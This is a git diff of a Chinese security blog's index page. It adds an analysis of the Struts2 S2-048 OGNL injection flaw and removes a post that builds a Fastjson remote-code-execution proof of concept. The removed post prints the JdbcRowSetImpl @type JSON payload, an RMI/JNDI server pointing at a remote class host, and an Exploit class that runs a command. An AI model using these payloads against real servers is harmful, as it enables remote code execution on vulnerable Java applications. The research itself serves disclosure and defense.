class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>这setAutoCommit里函数里会触发connect函数。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> Connection <span class="title">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.conn;</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            InitialContext var1 = <span class="keyword">new</span> InitialContext();</div><div class="line">            DataSource var2 = (DataSource)var1.lookup(<span class="keyword">this</span>.getDataSourceName());</div><div class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.getUsername() != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.getUsername().equals(<span class="string">""</span>)?var2.getConnection(<span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()):var2.getConnection();</div><div class="line">        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="keyword">this</span>.resBundle.handleGetObject(<span class="string">"jdbcrowsetimpl.connect"</span>).toString());</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getUrl() != <span class="keyword">null</span>?DriverManager.getConnection(<span class="keyword">this</span>.getUrl(), <span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()):<span class="keyword">null</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>这里面就调用InitialContext的lookup方法，而且找到的就是我们前面设置的DataSourceName(),达到远程调用任意类的目的。由于JdbcRowSetImpl是官方自带的库，所以这个PoC的威力相对来说更厉害。如果还在使用Fastjson 1.2.24版本及以下烦请升级。</p>
+<p>引用：<br>1，<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf" target="_blank" rel="external">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf</a><br>2,<a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/">http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+    <! -- 添加微信图标 -->
+    
+      
+    
+    
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2018/09/21/S2-048 动态分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="廖新喜">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxlegend">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/09/21/S2-048 动态分析/" itemprop="url">
+                  S2-048 动态分析
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-21T16:33:37+08:00">
+                2018-09-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Struts2/" itemprop="url" rel="index">
+                    <span itemprop="name">Struts2</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/09/21/S2-048 动态分析/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/09/21/S2-048 动态分析/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2018/09/21/S2-048 动态分析/" class="leancloud_visitors" data-flag-title="S2-048 动态分析">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h1 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h1><p>2017年7月7日，Apache Struts发布最新的安全公告，Apache Structs2的strus1插件存在远程代码执行的高危漏洞，漏洞编号为CVE-2017-9791（S2-048）。攻击者可以构造恶意的字段值通过Struts2的struts2-struts1-plugin的插件，远程执行代码</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>(1)    漏洞简介<br>Apache Struts2.3.x系列版本中struts2-struts1-plugin存在远程代码执行漏洞，进而导致任意代码执行。<br>(2)    漏洞分析<br>官方的漏洞描述如下：</p>
+<p>从官方的漏洞描述我们可以知道，这个漏洞本质上是在struts2-struts1-plugin这个jar包上。这个库是用将struts1的action封装成struts2的action以便在strut2上使用。本质原因还是在struts2-struts1-plugin包中Struts1Action.java中execute函数调用了getText函数，这个函数会执行ognl表达式，更可恶的是getText的输入内容还是攻击者可控的。以下分析基于struts2的官方示例struts2-showcase war包。首先Struts1Action的execute方法代码如下，从红框中信息可以看出其实质是调用SaveGangsterAction.execute方法，然后再调用getText(msg.getKey()….)。<br><img src="/images/048-1.png" alt="1"><br>在struts2-showcase的integration模块下有SaveGangsterAction.java的execute方法的实现。具体如下：<br><img src="/images/048-2.png" alt="2"><br>在这个方法中就带入有毒参数gforn.getName()放到了messages结构中，而gform.getName()的值是从客户端获取的。Gangsterform.getName()的实现如下：<br><img src="/images/048-3.png" alt="3"><br>我们这里传入了${1+1}。有毒参数已经带入，就差ognl表达式。继续回到Struts1Action.java的execute方法下半部分，这里有getText()的入口，能清晰看到参数已经被污染，具体如下图：<br><img src="/images/048-4.png" alt="4"><br>下面进入getText的实现函数：这个调用栈比较深，首先我们给出栈图：<br><img src="/images/048-5.png" alt="5"><br>从Struts1action.execute函数开始，到ActionSupport的getText()方法，方法如下：<br><img src="/images/048-6.png" alt="6"><br>接着进入TextProviderSuppport.getText，接着调用其另一个重载类方法getText(),示例如下：<br><img src="/images/048-7.png" alt="7"><br>如图所示，进入LocalizeTextUtil.findText，继续分析其实现：从名字上也能看出其是根据用户的配置做一些本地化的操作。代码如下：<br><img src="/images/048-8.png" alt="8"><br>熟悉struts2的童鞋跟到这一步就能发现这就是一个很典型的ognl表达式入口，先是得到一个valueStack，再继续递归得到ognl表达式的值。这里不再描述，详情可参考官方链接：<a href="https://struts.apache.org/maven/struts2-core/apidocs/com/opensymphony/xwork2/util/LocalizedTextUtil.html" target="_blank" rel="external">https://struts.apache.org/maven/struts2-core/apidocs/com/opensymphony/xwork2/util/LocalizedTextUtil.html</a><br>最后附上一个简单的测试用例图：<br><img src="/images/048-9.png" alt="9"><br><img src="/images/048-10.png" alt="10"></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+    <! -- 添加微信图标 -->
+    
+      
+    
+    
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2018/09/21/S2-057技术分析/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1682,570 +2219,6 @@ class java.lang.ProcessBuilder</code></p>
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2017/12/06/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="廖新喜">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xxlegend">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/12/06/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/" itemprop="url">
-                  基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-06T21:49:34+08:00">
-                2017-12-06
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Java/" itemprop="url" rel="index">
-                    <span itemprop="name">Java</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/12/06/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2017/12/06/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/2017/12/06/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/" class="leancloud_visitors" data-flag-title="基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>这篇文章主要是基于我在看雪2017开发者峰会的演讲而来，由于时间和听众对象的关系，在大会上主要精力都集中在反序列化的防御上。前面的Fastjson PoC的构造分析涉及得很少，另外我在5月份分享的Fastjson Poc构造与分析限制条件太多，所以写下这篇文章。</p>
-<h2 id="Fastjson-使用"><a href="#Fastjson-使用" class="headerlink" title="Fastjson 使用"></a>Fastjson 使用</h2><p>Fastjson是Alibaba开发的，Java语言编写的高性能JSON库。采用“假定有序快速匹配”的算法，号称Java语言中最快的JSON库。Fastjson接口简单易用，广泛使用在缓存序列化、协议交互、Web输出、Android客户端<br>提供两个主要接口toJsonString和parseObject来分别实现序列化和反序列化。项目地址：<code>https://github.com/alibaba/fastjson</code>。那我们看下如何使用？首先定义一个User.java,代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</div><div class="line">    <span class="keyword">private</span> Long   id;</div><div class="line">    <span class="keyword">private</span> String name;</div><div class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getId</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> id;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(Long id)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.id = id;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> name;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.name = name;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>序列化的代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</div><div class="line">User guestUser = <span class="keyword">new</span> User();</div><div class="line">guestUser.setId(<span class="number">2L</span>);</div><div class="line">guestUser.setName(<span class="string">"guest"</span>);</div><div class="line">String jsonString = JSON.toJSONString(guestUser);</div><div class="line">System.out.println(jsonString);</div></pre></td></tr></table></figure></p>
-<p>反序列化的代码示例：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">String jsonString = <span class="string">"&#123;\"name\":\"guest\",\"id\":12&#125;"</span>;</div><div class="line">User user = JSON.parseObject(jsonString, User.class);</div></pre></td></tr></table></figure></p>
-<p>上述代码的parseObject也可以直接用parse接口。</p>
-<h2 id="Fastjson安全特性"><a href="#Fastjson安全特性" class="headerlink" title="Fastjson安全特性"></a>Fastjson安全特性</h2><p>反序列化的Gadget需要无参默认构造方法或者注解指定构造方法并添加相应参数。使用Feature.SupportNonPublicField才能打开非公有属性的反序列化处理，@type可以指定反序列化任意类，调用其set，get，is方法。<br><img src="/images/JdbcRowSetImpl_1.png" alt="1"><br>上图则是Fastjson反序列框架图。JSON门面类，提供一些静态方法，如parse，parseObject.其主要功能都是在DefaultJSONParser类中实现。DefaultJSONParser引用了ParserConfig，主要保存一些相关配置信息。也引用了JSONLexerBase，这个类用来处理字符分析。而反序列化用到的JavaBeanDeserializer则是JavaBean反序列化处理主类。fastjson在1.2.24版本添加enable_autotype开关，将一些类加到黑名单中，后续我也给它报过bypass，fastjson也一并修复。</p>
-<h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p>JNDI即Java Naming and Directory Interface，翻译成中文就Java命令和目录接口，2016年的blackhat大会上web议题重点讲到，但是对于json这一块没有涉及。JNDI提供了很多实现方式，主要有RMI，LDAP，CORBA等。我们可以看一下它的架构图<br>!(2)[/images/JdbcRowSetImpl_2.png]，JNDI提供了一个统一的外部接口，底层SPI则是多样的。在使用JNDIReferences的时候可以远程加载外部的对象，即实现factory的初始化。如果说其lookup方法的参数是我们可以控制的，可以将其参数指向我们控制的RMI服务，切换到我们控制的RMI/LDAP服务等等。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</div><div class="line"><span class="comment">//http://xxlegend.com/Exploit.class</span></div><div class="line">Reference reference = <span class="keyword">new</span> javax.naming.Reference(“Exploit<span class="string">",“Exploit"</span>,<span class="string">"http://xxlegend.com/"</span>);</div><div class="line">ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(reference);</div><div class="line">registry.bind(“Exploit<span class="string">", referenceWrapper);</span></div></pre></td></tr></table></figure></p>
-<p>这段代码主要讲到了在1099端口上创建一个RMI服务，RMI的内容则是通过外部的http服务地址获取。在客户端则是将lookup的地址指向刚才我们创建的RMI服务，即能达到远程代码执行的目的。可以使用如下的请求端代码进行测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Hashtable env = new Hashtable();</div><div class="line">env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);</div><div class="line">env.put(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;);</div><div class="line">Context ctx = new InitialContext(env);</div><div class="line">Object local_obj = RicterCctx.lookup(&quot;rmi://xxlegend.com/Exploit&quot;);</div></pre></td></tr></table></figure></p>
-<p>那么攻击者的流程就是这样的。攻击者准备rmi服务和web服务，将rmi绝对路径注入到lookup方法中，受害者JNDI接口会指向攻击者控制rmi服务器，JNDI接口向攻击者控制web服务器远程加载恶意代码，执行构造函数形成RCE。</p>
-<h1 id="PoC构造与分析"><a href="#PoC构造与分析" class="headerlink" title="PoC构造与分析"></a>PoC构造与分析</h1><p>介绍的背景有点多，正式切入我们的正题，基于JdbcRowSetImpl的PoC是如何构造和执行的。在今年5月份的时候，我也公布了Fastjson基于TemplateImpl的PoC的，但是限制还比较多，需要打开SupportNonPublic开关，这个场景是比较少见的，详细的分析见我的博客<code>http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</code>，后续ricterz也作了一篇分析：<code>https://ricterz.me/posts/Fastjson%20Unserialize%20Vulnerability%20Write%20Up</code>。<br>在看雪峰会上我提到了好几种PoC，下面我简单的给这些PoC做个分类：<br>1，基于TemplateImpl<br>2，基于JNDI Bean Property类型<br>3，基于JNDI Field类型</p>
-<p>今天主讲基于JNDI Bean Property这个类型，这个类型和JNDI Field类型的区别就在于Bean Property需要借助setter，getter方法触发，而Field类型则没有这个必要。JdbcRowSetImpl刚好就在Bean Property分类之下，其他的PoC后续再讲。这个Poc相对于TemplateImpl却没有一点儿限制，当然java在JDK 6u132, 7u122, or 8u113补了是另外一码事。 PoC具体如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;<span class="string">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="string">"dataSourceName"</span>:<span class="string">"ldap://localhost:389/obj"</span>,<span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</div></pre></td></tr></table></figure></p>
-<p>由于这个PoC是基于JNDI，下面我们简单构造一下，首先是服务端的代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIServer</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span></span></div><div class="line">            AlreadyBoundException, RemoteException, NamingException &#123;</div><div class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</div><div class="line">        <span class="comment">//http://xxlegend.com/Exploit.class即可</span></div><div class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">"Exloit"</span>,</div><div class="line">                <span class="string">"Exploit"</span>,<span class="string">"http://xxlegend.com/"</span>);</div><div class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</div><div class="line">        registry.bind(<span class="string">"Exploit"</span>,referenceWrapper);</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException </span>&#123;</div><div class="line">        start();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>rmi服务端需要一个Exploit.class放到rmi指向的web服务器目录下，这个Exploit.class是一个factory，通过Exploit.java编译得来，在JNDI执行的过程会被初始化。如下是Exploit.java的代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">try</span>&#123;</div><div class="line">            Runtime.getRuntime().exec(<span class="string">"calc"</span>);</div><div class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</div><div class="line">        Exploit e = <span class="keyword">new</span> Exploit();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>服务端构造好之后，下面来看java应用执行的代码，示例如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcRowSetImplPoc</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</div><div class="line">        testJdbcRowSetImpl();</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testJdbcRowSetImpl</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="comment">//        String payload = "&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\"," +</span></div><div class="line"><span class="comment">//                " \"autoCommit\":true&#125;";</span></div><div class="line">        String payload = <span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\","</span> +</div><div class="line">                <span class="string">" \"autoCommit\":true&#125;"</span>;</div><div class="line">        JSON.parse(payload);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>完整的代码已经放到<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">PoC调用栈如下</div><div class="line">![3](/images/JdbcRowSetImpl_3.png)</div><div class="line">从这个调用栈就可以看出，在进入Gadget之前，首先是Java应用调用Fastjson的parseObject或者parse接口，进入JavaObjectDeserializer.deserialize方法，经过一系列判断之后发现是JavaBean，就会调用JavaBeanDeserializer.deserialize接口,反序列化得到Gadget相关域，在这个过程中都是通过反射调用这些域的getter，setter或者is方法，这就正式在Gadget执行代码。下面看一下在Gadget中执行的代码。在反序列化过程中是有次序来调用相应接口的，首先是设置dataSourceName属性，这个是其父类BaseRowSet继承过来的。</div><div class="line">```java</div><div class="line">public void setDataSourceName(String name) throws SQLException &#123;</div><div class="line"></div><div class="line">    if (name == null) &#123;</div><div class="line">        dataSource = null;</div><div class="line">    &#125; else if (name.equals(&quot;&quot;)) &#123;</div><div class="line">       throw new SQLException(&quot;DataSource name cannot be empty string&quot;);</div><div class="line">    &#125; else &#123;</div><div class="line">       dataSource = name;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    URL = null;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>设置autoCommit属性:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAutoCommit</span><span class="params">(<span class="keyword">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException </span>&#123;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">this</span>.conn = <span class="keyword">this</span>.connect();</div><div class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>这setAutoCommit里函数里会触发connect函数。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> Connection <span class="title">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.conn;</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            InitialContext var1 = <span class="keyword">new</span> InitialContext();</div><div class="line">            DataSource var2 = (DataSource)var1.lookup(<span class="keyword">this</span>.getDataSourceName());</div><div class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.getUsername() != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.getUsername().equals(<span class="string">""</span>)?var2.getConnection(<span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()):var2.getConnection();</div><div class="line">        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="keyword">this</span>.resBundle.handleGetObject(<span class="string">"jdbcrowsetimpl.connect"</span>).toString());</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getUrl() != <span class="keyword">null</span>?DriverManager.getConnection(<span class="keyword">this</span>.getUrl(), <span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()):<span class="keyword">null</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
